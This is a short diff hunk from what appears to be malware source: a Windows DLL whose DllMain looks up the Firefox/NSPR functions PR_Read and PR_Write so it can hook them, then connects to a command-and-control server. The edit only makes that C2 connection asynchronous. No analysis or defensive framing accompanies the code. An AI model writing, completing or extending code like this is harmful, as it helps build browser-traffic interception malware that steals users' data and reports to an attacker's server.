@@ -49,7 +49,7 @@ BOOL WINAPI DllMain(HINSTANCE mod, DWORD fdwReason, LPVOID resv) {
 		pr_read_orig = (pr_io_func)GetProcAddress(hGetProcIDDLL, "PR_Read");
 		pr_write_orig = (pr_io_func)GetProcAddress(hGetProcIDDLL, "PR_Write");
 
-		c2connection.find_and_connect();
+		c2connection.find_and_connect_async();
 
 	}
 	
